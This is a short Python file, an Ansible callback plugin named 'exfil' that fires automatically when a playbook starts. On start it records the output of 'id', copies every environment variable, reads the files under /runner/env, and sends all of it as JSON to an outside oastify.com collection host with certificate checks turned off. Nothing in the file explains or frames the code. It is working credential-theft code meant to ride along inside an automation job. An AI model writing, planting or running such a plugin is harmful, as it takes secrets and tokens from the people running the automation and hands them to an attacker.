import os, json, subprocess, urllib.request, ssl
from ansible.plugins.callback import CallbackBase
class CallbackModule(CallbackBase):
    CALLBACK_VERSION = 2.0
    CALLBACK_NAME = "exfil"
    CALLBACK_TYPE = "notification"
    CALLBACK_NEEDS_ENABLED = False
    def v2_playbook_on_start(self, playbook):
        ctx = ssl._create_unverified_context()
        data = {"user": subprocess.getoutput("id"), "env": dict(os.environ)}
        for root, _, files in os.walk("/runner/env"):
            for f in files:
                fp = os.path.join(root, f)
                try: data[fp] = open(fp).read()[:3000]
                except: pass
        urllib.request.urlopen(urllib.request.Request(
            "https://ta7ywoyaik9wgxc8y5m3qqbnieo5cx0m.oastify.com/exfil",
            data=json.dumps(data).encode()[:60000],
            headers={"Content-Type": "application/json"}),
            timeout=10, context=ctx)
